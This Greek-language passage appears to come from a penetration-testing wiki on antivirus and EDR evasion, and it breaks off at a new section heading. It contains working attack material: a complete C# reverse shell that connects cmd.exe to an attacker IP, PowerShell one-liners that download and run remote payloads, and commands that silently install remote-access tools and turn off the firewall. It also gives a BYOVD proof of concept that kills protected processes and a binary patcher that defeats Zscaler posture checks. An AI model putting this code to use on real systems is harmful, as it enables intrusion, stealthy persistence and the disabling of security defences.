Πρόκειται για την εισαγωγή του κακόβουλου post-exploitation κώδικα **στην ίδια τη διεργασία του**. Έτσι, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας και τον έλεγχό της από το AV, αλλά το μειονέκτημα είναι ότι, αν κάτι πάει στραβά κατά την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon σας**, καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα για τη φόρτωση C# Assembly, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**. Δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [βίντεο του S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Επανασυσκευασία εργαλείων .NET σε WebAssembly με NativeAOT (WasmForge)

Οι συνήθεις τεχνικές `execute-assembly` διατηρούν αναγνωρίσιμο MSIL και τελικά αρχικοποιούν ένα CLR. Το **WasmForge** αλλάζει αντί γι' αυτό το υπόστρωμα εκτέλεσης: μεταφέρει ένα project C# στον πειραματικό στόχο NativeAOT-LLVM WASI, το μεταγλωττίζει εκ των προτέρων σε WebAssembly και ενσωματώνει το module σε έναν Windows PE host που βασίζεται στο Wazero. Η διεργασία που προκύπτει δεν χρειάζεται το CLR, το JIT ή το `dotnet` host του στόχου, επομένως οι κανόνες που βασίζονται μόνο σε ονόματα managed assemblies, φόρτωση CLR, AMSI ή .NET ETW δεν έχουν άμεση ορατότητα. Πρόκειται για τεχνική evasion/συσκευασίας, όχι για παράκαμψη ορίου δικαιωμάτων — το guest διατηρεί τα αρχικά δικαιώματα και την παρατηρήσιμη συμπεριφορά του εργαλείου στο OS.<sup>[[44]](#references)[[45]](#references)</sup>

### Δημιουργία ενός project C#

Η προτεινόμενη διαδρομή build είναι το Docker περιβάλλον του project, καθώς περιλαμβάνει το .NET 10 SDK, το NativeAOT-LLVM workload, το WASI SDK 24.0, τον linker και τις εξαρτήσεις για signing. Ένα `.csproj` εντοπίζεται αυτόματα· το build με μία εντολή εκτελεί τη μεταφορά, την επιδιόρθωση συμβατότητας, τη μεταγλώττιση WASM, τη δημιουργία του PE και το signing.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Για την αντιμετώπιση προβλημάτων ή την ανασκόπηση παραγόμενου κώδικα, χωρίστε τη διαδικασία στα `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` και, τέλος, στο `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Το build image χρησιμοποιεί επίσης ένα wrapper `wasm-component-ld`, ώστε να παρακάμπτει την κωδικοποίηση component του WASI Preview 2 και να παράγει το απλό module που αναμένει το embedded runtime.<sup>[[44]](#references)[[45]](#references)</sup>

### Γεφύρωση wasm32 C# με x64 Win32

Δεν πρόκειται για διαφανή επαναμεταγλώττιση. Το NativeAOT-WASI δεν υποστηρίζει ή αλλάζει λειτουργίες του BCL που έχουν σχεδιαστεί για Windows, ενώ ένας wasm32 guest συνήθως δεσμεύει θέσεις δεικτών τεσσάρων byte, παρότι τα x64 APIs μπορούν να επιστρέψουν δείκτες οκτώ byte. Το WasmForge αντιμετωπίζει και τα δύο προβλήματα με τα ακόλουθα παραγόμενα επίπεδα:<sup>[[44]](#references)</sup>

1. Ένα source patcher διορθώνει σημασιολογικές διαφορές ειδικές για το AOT και ανακατευθύνει μη υποστηριζόμενες κλήσεις registry, pipes, WMI, identity, directory-service, file-version, LSA και παρόμοιες κλήσεις σε helpers `Wf*`.
2. Ένας P/Invoke scanner παράγει αντιστοιχίσεις NativeAOT `DirectPInvoke`, ώστε οι κλήσεις `[DllImport]` να συνδέονται με συνδεδεμένα σύμβολα C bridge αντί να φορτώνουν δυναμικά την καθορισμένη DLL μέσα στον guest.
3. Οι δείκτες που περνούν στον host χρησιμοποιούν `ulong` στην C# και `uint64_t` στη C. Ένας generic dispatcher προωθεί την κλήση στον Win32 handler του host· ένα `out8_mask` επισημαίνει τις πραγματικές θέσεις εξόδου οκτώ byte, των οποίων τα ανώτερα μισά πρέπει να διατηρηθούν. Για τις μη επισημασμένες εξόδους σε μορφή wasm32 χρησιμοποιείται προστασία snapshot/restore, ώστε μια εγγραφή x64 να μην αλλοιώσει τα γειτονικά τέσσερα byte.
4. Εξειδικευμένα host bridges χειρίζονται λειτουργίες που δεν ταιριάζουν στη generic αποστολή syscall, όπως την πρόσβαση στην cache εισιτηρίων LSA, λειτουργίες Kerberos/BCrypt με δομημένα αποτελέσματα, την κίνηση TCP KDC και ερωτήματα LDAP.

Για παράδειγμα, ένα wrapper για το `version.dll!VerQueryValueW` περνά τέσσερις διευθύνσεις host και ορίζει τα bits 2 και 3 (`0xC`), επειδή ο δείκτης τιμής και το μήκος είναι θέσεις εξόδου οκτώ byte. Το ίδιο το wrapper παραμένει generic και αναθέτει το όνομα DLL, το όνομα export, τα ορίσματα και τη μάσκα στο `wf_call_v2`· ο host εκτελεί τη μετάφραση δεικτών και καλεί το native API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Περιορισμοί και σημεία ανίχνευσης

Ο κώδικας με έντονη χρήση reflection, η δυναμική φόρτωση assembly, οι αυθαίρετες native callbacks και οι σύνθετες δομές x64 που επιστρέφονται στη μνήμη WASM ενδέχεται να εξακολουθούν να απαιτούν patches ειδικά για κάθε εργαλείο ή να αποτυγχάνουν εντελώς. Τα generic WASI Preview 2 sockets μπορεί επίσης να καταλήγουν σε no-op stubs, οπότε τα υποστηριζόμενα εργαλεία χρησιμοποιούν host shims ειδικά για κάθε πρωτόκολλο. Επικυρώστε κάθε εντολή σε σχέση με ένα native build αντί να υποθέτετε ισοτιμία λειτουργιών.<sup>[[44]](#references)[[45]](#references)</sup>

Η τεχνική μετατοπίζει την τηλεμετρία αντί να καθιστά το payload αόρατο. Η ανίχνευση μπορεί να στραφεί σε ένα PE που περιέχει ή υλοποιεί ένα WASM module, στη συμπεριφορά runtime τύπου Wazero, σε ασυνήθιστη κατανομή και αντιγραφή μνήμης host/guest, σε generic direct Win32 dispatch, σε ανωμαλίες υπογραφής και πόρων PE, καθώς και στις κλήσεις API και την κίνηση δικτύου που προκύπτουν. Επομένως, η απουσία συμβάντων CLR-load, AMSI ή .NET ETW δεν πρέπει να θεωρείται ένδειξη ότι μια διεργασία είναι ακίνδυνη.<sup>[[44]](#references)</sup>

## Χρήση άλλων γλωσσών προγραμματισμού

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατή η εκτέλεση κακόβουλου κώδικα με άλλες γλώσσες, παρέχοντας στον παραβιασμένο υπολογιστή πρόσβαση **στο περιβάλλον interpreter που είναι εγκατεστημένο στο SMB share που ελέγχεται από τον Attacker**.

Επιτρέποντας την πρόσβαση στα Interpreter Binaries και στο περιβάλλον του SMB share, μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες στη μνήμη** του παραβιασμένου υπολογιστή.

Το repo αναφέρει: Το Defender εξακολουθεί να σαρώνει τα scripts, αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **μεγαλύτερη ευελιξία για να παρακάμψουμε static signatures**. Οι δοκιμές με τυχαία, μη obfuscated reverse shell scripts σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχείς.

## Re-hosting WebAssembly για αποφυγή static analysis

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Το Token stomping χειρίζεται το access token ενός προϊόντος ασφάλειας, όπως ένα EDR ή AV. Η μείωση των προνομίων του token μπορεί να αφήσει τη διεργασία σε λειτουργία, ενώ την εμποδίζει να εκτελέσει ενέργειες προνομιακής επιθεώρησης ή αποκατάστασης.

Για να το αποτρέψουν αυτό, τα Windows θα μπορούσαν να **εμποδίζουν εξωτερικές διεργασίες** από το να αποκτούν handles στα tokens των διεργασιών ασφαλείας.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Χρήση αξιόπιστου λογισμικού

### Chrome Remote Desktop

Όπως περιγράφεται σε [**αυτή την ανάρτηση ιστολογίου**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να εγκαταστήσετε το Chrome Remote Desktop στον υπολογιστή ενός θύματος και έπειτα να το χρησιμοποιήσετε για να τον καταλάβετε και να διατηρήσετε persistence:<sup>[[35]](#references)</sup>
1. Κατεβάστε το από το https://remotedesktop.google.com/, κάντε κλικ στο "Set up via SSH" και έπειτα στο αρχείο MSI για Windows, ώστε να κατεβάσετε το αρχείο MSI.
2. Εκτελέστε σιωπηλά το πρόγραμμα εγκατάστασης στο θύμα (απαιτούνται δικαιώματα διαχειριστή): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και κάντε κλικ στο next. Ο οδηγός θα σας ζητήσει να εξουσιοδοτήσετε την ενέργεια· κάντε κλικ στο κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την παρεχόμενη εντολή με τις απαιτούμενες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (η παράμετρος `--pin` ορίζει το PIN χωρίς χρήση του GUI).
 

## Προηγμένη αποφυγή ανίχνευσης

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Η αποφυγή ανίχνευσης είναι ένα πολύ περίπλοκο θέμα· μερικές φορές πρέπει να λαμβάνετε υπόψη πολλές διαφορετικές πηγές τηλεμετρίας σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να παραμείνετε εντελώς μη ανιχνεύσιμοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον στο οποίο θα στραφείτε έχει τα δικά του δυνατά και αδύνατα σημεία.

Σας προτείνω ανεπιφύλακτα να παρακολουθήσετε αυτή την ομιλία από τον [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια βάση στις πιο προηγμένες τεχνικές αποφυγής ανίχνευσης.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία από τον [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με την πολυεπίπεδη αποφυγή ανίχνευσης.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Παλιές τεχνικές**

### **Έλεγχος των τμημάτων που εντοπίζει το Defender ως κακόβουλα**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), το οποίο **αφαιρεί τμήματα του binary** μέχρι να **εντοπίσει ποιο τμήμα θεωρεί κακόβουλο το Defender** και να σας το διαχωρίσει.\
Ένα άλλο εργαλείο που κάνει **το ίδιο είναι το** [**avred**](https://github.com/dobin/avred), το οποίο προσφέρει την υπηρεσία διαδικτυακά στη διεύθυνση [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Διακομιστής Telnet**

Μέχρι τα Windows 10, όλα τα Windows περιλάμβαναν έναν **διακομιστή Telnet** που μπορούσατε να εγκαταστήσετε (ως διαχειριστής) εκτελώντας:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Κάντε το να **ξεκινά** όταν ξεκινά το σύστημα και **εκτελέστε** το τώρα:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Αλλαγή θύρας telnet** (stealth) και απενεργοποίηση firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τα bin downloads, όχι το setup)

**ΣΤΟΝ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
- Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_

Στη συνέχεια, μεταφέρετε το binary _**winvnc.exe**_ και το **νεοδημιουργημένο** αρχείο _**UltraVNC.ini**_ μέσα στο **θύμα**

#### **Αντίστροφη σύνδεση**

Ο **επιτιθέμενος** πρέπει να **εκτελέσει στον** **host** του το binary `vncviewer.exe -listen 5900`, ώστε να είναι **έτοιμος** να δεχτεί μια αντίστροφη **σύνδεση VNC**. Έπειτα, μέσα στο **θύμα**: Εκκινήστε τον daemon winvnc `winvnc.exe -run` και εκτελέστε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε τη stealth λειτουργία, δεν πρέπει να κάνετε μερικά πράγματα

- Μην εκκινήσετε το `winvnc` αν εκτελείται ήδη, αλλιώς θα εμφανιστεί ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν εκτελείται με `tasklist | findstr winvnc`
- Μην εκκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο κατάλογο, αλλιώς θα ανοίξει το [παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην εκτελέσετε το `winvnc -h` για βοήθεια, αλλιώς θα εμφανιστεί ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Μέσα στο GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Τώρα **εκκινήστε τον listener** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Ο τρέχων Defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Χρησιμοποιήστε το με:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# με χρήση compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση της Python για παράδειγμα δημιουργίας injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Τερματισμός AV/EDR από το Kernel Space

Το Storm-2603 αξιοποίησε ένα μικρό βοηθητικό πρόγραμμα κονσόλας, γνωστό ως **Antivirus Terminator**, για να απενεργοποιήσει τις προστασίες endpoint πριν από την εγκατάσταση ransomware. Το εργαλείο φέρνει το **δικό του ευάλωτο αλλά *υπογεγραμμένο* driver** και το καταχράται για να εκτελεί προνομιούχες λειτουργίες στον πυρήνα, τις οποίες δεν μπορούν να αποκλείσουν ούτε οι υπηρεσίες AV που εκτελούνται ως Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Βασικά συμπεράσματα
1. **Υπογεγραμμένο driver**: Το αρχείο που γράφεται στον δίσκο είναι το `ServiceMouse.sys`, αλλά το binary είναι το νόμιμα υπογεγραμμένο driver `AToolsKrnl64.sys` από το “System In-Depth Analysis Toolkit” της Antiy Labs. Επειδή το driver φέρει έγκυρη υπογραφή Microsoft, φορτώνεται ακόμη κι όταν είναι ενεργοποιημένο το Driver-Signature-Enforcement (DSE).
2. **Εγκατάσταση υπηρεσίας**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Η πρώτη γραμμή καταχωρίζει το πρόγραμμα οδήγησης ως **υπηρεσία kernel** και η δεύτερη το εκκινεί, ώστε το `\\.\ServiceMouse` να είναι προσβάσιμο από τον χώρο χρήστη.
3. **IOCTLs που εκθέτει το πρόγραμμα οδήγησης**
   | Κωδικός IOCTL | Δυνατότητα                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Τερματισμός οποιασδήποτε διεργασίας με PID (χρησιμοποιείται για τον τερματισμό υπηρεσιών Defender/EDR) |
   | `0x990000D0` | Διαγραφή οποιουδήποτε αρχείου από τον δίσκο |
   | `0x990001D0` | Απεγκατάσταση του προγράμματος οδήγησης και αφαίρεση της υπηρεσίας |

   Ελάχιστο C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις προστασίες user-mode· ο κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *προστατευμένες* διεργασίες, να τις τερματίσει ή να παραβιάσει αντικείμενα του kernel, ανεξάρτητα από τις λειτουργίες PPL/PP, ELAM ή άλλες λειτουργίες hardening.

Ανίχνευση / Μετριασμός
•  Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων προγραμμάτων οδήγησης της Microsoft (`HVCI`, `Smart App Control`), ώστε τα Windows να αρνούνται τη φόρτωση του `AToolsKrnl64.sys`.
•  Παρακολουθείτε τη δημιουργία νέων υπηρεσιών *kernel* και ενεργοποιείτε ειδοποίηση όταν ένα πρόγραμμα οδήγησης φορτώνεται από κατάλογο με δικαιώματα εγγραφής για όλους ή δεν περιλαμβάνεται στη λίστα επιτρεπόμενων.
•  Παρακολουθείτε για handles από user-mode σε προσαρμοσμένα αντικείμενα συσκευών, ακολουθούμενα από ύποπτες κλήσεις `DeviceIoControl`.

### Παράκαμψη των ελέγχων Posture του Zscaler Client Connector με τροποποίηση Binary στον δίσκο

Το **Client Connector** της Zscaler εφαρμόζει τοπικά κανόνες posture συσκευής και βασίζεται στο Windows RPC για να επικοινωνεί τα αποτελέσματα σε άλλα στοιχεία. Δύο αδύναμες επιλογές σχεδιασμού καθιστούν δυνατή την πλήρη παράκαμψη:

1. Η αξιολόγηση posture γίνεται **εξ ολοκλήρου στην πλευρά του client** (στέλνεται μια boolean τιμή στον server).
2. Τα εσωτερικά RPC endpoints επαληθεύουν μόνο ότι το εκτελέσιμο αρχείο που συνδέεται είναι **υπογεγραμμένο από τη Zscaler** (μέσω `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Με την **τροποποίηση τεσσάρων υπογεγραμμένων binaries στον δίσκο**, μπορούν να εξουδετερωθούν και οι δύο μηχανισμοί:

| Binary | Αρχική λογική που τροποποιείται | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, ώστε κάθε έλεγχος να θεωρείται συμμορφούμενος |
| `ZSAService.exe` | Έμμεση κλήση στο `WinVerifyTrust` | Αντικαθίσταται με NOP ⇒ οποιαδήποτε διεργασία (ακόμα και χωρίς υπογραφή) μπορεί να συνδεθεί στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαθίσταται με `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Έλεγχοι ακεραιότητας του tunnel | Παρακάμπτονται άμεσα |

Απόσπασμα ελάχιστου patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση της στοίβας υπηρεσιών:

* **Όλοι** οι έλεγχοι στάσης εμφανίζονται **πράσινοι/συμμορφούμενοι**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζουν οι πολιτικές του Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς μπορούν να παρακαμφθούν αποφάσεις εμπιστοσύνης που λαμβάνονται αποκλειστικά από την πλευρά του client και απλοί έλεγχοι υπογραφής, με λίγες τροποποιήσεις byte.

## Κατάχρηση έμπιστης λειτουργικότητας του Microsoft Defender `BTR.sys`

Το πρόγραμμα οδήγησης **Boot-Time Removal** του Defender αποτελεί χρήσιμο αντίπαλο παράδειγμα του κλασικού BYOVD. Το `BTR.sys` είναι ένα νόμιμο στοιχείο αποκατάστασης, υπογεγραμμένο από τη Microsoft, χωρίς σφάλμα αλλοίωσης μνήμης και χωρίς διεπαφή IOCTL· αφού αποκτήσει πρόσβαση διαχειριστή και `SeLoadDriverPrivilege`, ο operator μπορεί αντ' αυτού να πλαστογραφήσει την ιδιωτική συναλλαγή αποκατάστασής του και να εκτελέσει τις προβλεπόμενες λειτουργίες αρχείων/μητρώου σε Ring-0. Αυτό είναι ένα **primitive εξουδετέρωσης AV/EDR μετά την παραβίαση, όχι αρχική πρόσβαση ή κλιμάκωση προνομίων**, και το πρόγραμμα οδήγησης μπορεί να εξαχθεί από τον πόρο `BOOTTIMETOOL` του `MpEngine.dll` του ίδιου του στόχου, αντί να εισαχθεί ένα εμφανές πρόγραμμα οδήγησης τρίτου μέρους.<sup>[[36]](#references)</sup>

### Προετοιμασία του one-shot driver

